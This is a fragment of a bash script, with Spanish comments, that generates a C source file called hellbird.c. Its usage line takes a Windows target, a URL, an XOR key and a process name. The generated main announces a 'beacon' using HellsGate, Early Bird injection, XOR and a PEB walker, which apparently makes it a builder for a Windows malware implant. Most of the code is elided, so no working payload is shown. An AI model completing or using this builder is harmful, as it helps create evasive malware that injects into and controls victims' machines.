...
# === USO ===
usage() {
    echo "Usage: $0 --target <windows> --url <url> [--key <xor_key>] [--process-name <path>]"
    exit 1
}
...
# === GENERAR hellbird.c (FUSIÓN FINAL) ===
cat > hellbird.c << EOF
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
...
// === MAIN ===
int main() {
    printf("[*] Iniciando beacon con HellsGate + Early Bird + XOR + PEB Walker...\n");
    fflush(stdout);
